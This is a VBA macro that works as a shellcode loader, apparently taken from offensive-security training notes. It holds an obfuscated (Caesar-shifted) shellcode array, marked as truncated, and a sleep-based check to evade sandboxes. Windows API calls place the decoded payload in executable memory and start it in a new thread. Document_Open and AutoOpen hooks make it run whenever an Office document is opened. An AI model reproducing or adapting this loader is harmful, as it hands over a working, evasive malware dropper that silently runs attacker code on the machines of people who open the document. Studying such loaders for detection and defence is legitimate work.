' --- Windows API Imports ---
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" ( _
    ByVal SecurityAttributes As Long, _
    ByVal StackSize As Long, _
    ByVal StartFunction As LongPtr, _
    ThreadParameter As LongPtr, _
    ByVal CreateFlags As Long, _
    ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" ( _
    ByVal lDestination As LongPtr, _
    ByRef sSource As Any, _
    ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Sub Sleep Lib "KERNEL32" ( _
    ByVal mili As Long)

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim i As Long
    
    ' --- Encrypted shellcode (Caesar +2) ---
    buf = Array(254, 132, 2, 2, 2, 98, 139, 231, 51, 194, 102, _
                141, 82, 50, 141, 84, 14, 141, 84, 22, 141, 116, _
                42, 17, 185, 76, 40, 51, 1, 174, 62, 99, ...) 
    ' (truncated for notes, full payload goes here)

    ' --- Time-lapse Evasion (Sleep Check) ---
    Dim t1 As Date, t2 As Date, elapsed As Long
    t1 = Now()
    Sleep (2000)             ' Sleep 2 seconds
    t2 = Now()
    elapsed = DateDiff("s", t1, t2)
    If elapsed < 2 Then Exit Function   ' Exit in sandbox

    ' --- Runtime Decryption (Caesar -2) ---
    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i

    ' --- Allocate Memory & Copy Decrypted Shellcode ---
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' --- Execute Payload ---
    res = CreateThread(0, 0, addr, 0, 0, 0)

End Function

' --- Auto-run triggers when document opens ---
Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub
